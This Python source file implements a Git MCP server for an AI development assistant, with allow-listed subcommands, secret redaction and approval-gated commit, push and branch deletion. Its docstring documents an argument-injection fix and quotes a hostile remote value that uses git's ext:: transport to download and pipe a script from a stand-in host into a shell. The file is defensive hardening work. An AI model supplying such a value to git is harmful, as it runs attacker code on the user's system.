"""DevPilot Git MCP Server.

Closes the 7th-server gap between the project design doc (7 MCP servers,
including Git) and the build-instructions file's Stage sequence (only 6,
folding git into Terminal MCP's allow-list). Scope taken directly from the
build-instructions file's §19 "Git security": approval required before
commit, push, and branch deletion -- nothing else invented.

Reuses three already-proven mechanisms: Terminal/Docker's allow-list +
no-shell subprocess pattern, and Stage 8's ctx.elicit() approval for the
three gated tools. Full rationale logged in
DevPilot_AI_Implementation_Log.html Entry 16.

Entry 41 (gap-fix, 2026-08-23): output now passed through
mcp_servers.security.redact_secrets() before being returned -- a `git
diff`/`git log` can surface a secret someone committed, and this project
already treats secret exposure as worth defending against even when the
underlying content is "real" data rather than a bug (same instinct as the
Filesystem/Terminal redaction added in the same pass).

Entry 42 (gap-fix, 2026-08-23, found during a deeper follow-up audit):
git_push's `remote`/`branch` and git_create_branch/git_delete_branch's
`name` are caller-controlled strings that reached argv as plain
positional arguments, with no validation at all. Two real problems, not
one: (1) a value starting with `-` could be misread as a flag rather than
a ref/remote name (classic argument-injection shape); (2) far more
seriously, git supports "remote helper" transports selected by a `x::`
prefix in the remote string itself -- `ext::` in particular runs its
remainder as a literal shell command (e.g. remote=`"ext::sh -c 'curl
evil|sh'"` makes `git push` execute that command directly, no leading
dash needed at all). Human approval already gates every call to these
three tools, which provides *some* mitigation (the elicitation message
does show the raw remote string before anyone clicks Approve), but the
message gives no indication that a given string is a command rather than
a remote name -- relying on a human noticing that on sight is not a real
control. _reject_unsafe_git_identifier() below rejects both shapes
before the approval prompt is even shown, so a malformed value never
reaches argv regardless of what gets approved.
"""

import subprocess

from pydantic import BaseModel

from mcp.server import MCPServer
from mcp.server.mcpserver import AcceptedElicitation, Context

from mcp_servers.security import redact_secrets
from mcp_servers.workspace import resolve_workspace_root

WORKSPACE_ROOT = resolve_workspace_root()

ALLOWED_SUBCOMMANDS = {"status", "log", "diff", "branch", "commit", "push", "checkout"}
DEFAULT_TIMEOUT_SECONDS = 60

mcp = MCPServer("DevPilot Git")


def _run_git(args: list[str], timeout: int = DEFAULT_TIMEOUT_SECONDS) -> dict:
    """Run one allow-listed git subcommand, no shell, fixed to the workspace root."""
    if not args or args[0] not in ALLOWED_SUBCOMMANDS:
        got = args[0] if args else "(empty)"
        raise ValueError(
            f"Git subcommand '{got}' is not allowed. Allowed: {sorted(ALLOWED_SUBCOMMANDS)}"
        )

    argv = ["git", *args]

    try:
        completed = subprocess.run(
            argv,
            cwd=WORKSPACE_ROOT,
            capture_output=True,
            text=True,
            timeout=timeout,
            shell=False,
        )
    except subprocess.TimeoutExpired as exc:
        raise TimeoutError(f"git {' '.join(args)} timed out after {timeout}s") from exc
    except FileNotFoundError as exc:
        raise FileNotFoundError("git is not installed or not on PATH.") from exc

    return {
        "stdout": redact_secrets(completed.stdout),
        "stderr": redact_secrets(completed.stderr),
        "exit_code": completed.returncode,
    }


class GitApproval(BaseModel):
    """No extra fields needed -- the accept/decline/cancel action IS the answer."""


def _reject_unsafe_git_identifier(value: str, kind: str) -> None:
    """Guard for any caller-controlled remote/branch/ref name that reaches
    argv as a bare positional argument (not consumed as a flag's value the
    way git_commit's `message` or git_delete_branch's `name` already are).
    Rejects a leading '-' (could be misread as a flag) and any `x::`
    remote-helper transport prefix (`ext::` runs its remainder as a literal
    shell command -- see module docstring, Entry 42)."""
    if not value:
        raise ValueError(f"Git {kind} name cannot be empty.")
    if value.startswith("-"):
        raise ValueError(f"'{value}' is not a valid git {kind} -- must not start with '-'.")
    if "::" in value:
        raise ValueError(
            f"'{value}' is not a valid git {kind} -- remote-helper transport "
            f"syntax (e.g. 'ext::') is not allowed."
        )


# --- Read-only, no approval -------------------------------------------------


@mcp.tool()
def git_status() -> dict:
    """Show working tree status (git status --short)."""
    return _run_git(["status", "--short"])


@mcp.tool()
def git_log(limit: int = 10) -> dict:
    """Show recent commit history (git log --oneline)."""
    return _run_git(["log", f"-{limit}", "--oneline"])


@mcp.tool()
def git_diff(path: str | None = None) -> dict:
    """Show unstaged changes, optionally scoped to one path."""
    args = ["diff"]
    if path is not None:
        args += ["--", path]
    return _run_git(args)


@mcp.tool()
def git_list_branches() -> dict:
    """List local and remote-tracking branches (git branch -a)."""
    return _run_git(["branch", "-a"])


# --- Write, ungated (low-risk, easily reversible) ---------------------------


@mcp.tool()
def git_create_branch(name: str) -> dict:
    """Create and switch to a new local branch (git checkout -b)."""
    _reject_unsafe_git_identifier(name, "branch")
    return _run_git(["checkout", "-b", name])


# --- Write, approval-gated per build-instructions §19 -----------------------


@mcp.tool()
async def git_commit(message: str, ctx: Context) -> dict:
    """Commit staged changes, after approval."""
    outcome = await ctx.elicit(
        message=f"DevPilot wants to commit with message: '{message}'. Approve?",
        schema=GitApproval,
    )
    if not isinstance(outcome, AcceptedElicitation):
        raise PermissionError(f"Commit was not approved (action={outcome.action}).")
    return _run_git(["commit", "-m", message])


@mcp.tool()
async def git_delete_branch(name: str, force: bool, ctx: Context) -> dict:
    """Delete a local branch, after approval."""
    _reject_unsafe_git_identifier(name, "branch")
    outcome = await ctx.elicit(
        message=f"DevPilot wants to delete branch '{name}'{' (force)' if force else ''}. Approve?",
        schema=GitApproval,
    )
    if not isinstance(outcome, AcceptedElicitation):
        raise PermissionError(f"Deletion of branch '{name}' was not approved (action={outcome.action}).")
    return _run_git(["branch", "-D" if force else "-d", name])


@mcp.tool()
async def git_push(ctx: Context, remote: str = "origin", branch: str | None = None) -> dict:
    """Push to a remote, after approval."""
    _reject_unsafe_git_identifier(remote, "remote")
    if branch is not None:
        _reject_unsafe_git_identifier(branch, "branch")
    outcome = await ctx.elicit(
        message=f"DevPilot wants to push to '{remote}'{f'/{branch}' if branch else ''}. Approve?",
        schema=GitApproval,
    )
    if not isinstance(outcome, AcceptedElicitation):
        raise PermissionError(f"Push to '{remote}' was not approved (action={outcome.action}).")
    args = ["push", remote] + ([branch] if branch else [])
    return _run_git(args)


if __name__ == "__main__":
    mcp.run()
